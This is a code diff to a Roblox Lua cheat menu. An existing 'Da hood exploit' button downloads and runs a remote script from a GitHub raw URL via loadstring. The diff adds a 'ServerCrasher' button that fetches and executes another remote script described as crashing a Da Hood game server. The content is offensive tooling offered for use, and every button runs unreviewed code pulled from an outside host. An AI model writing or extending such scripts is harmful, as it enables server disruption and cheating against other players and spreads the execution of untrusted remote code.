@@ -14,3 +14,8 @@ end)
 MainSection:NewButton("RAYX", "Da hood exploit", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
 end)
+
+
+MainSection:NewButton("ServerCrasher", "Crashesdahoodserver", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+end)
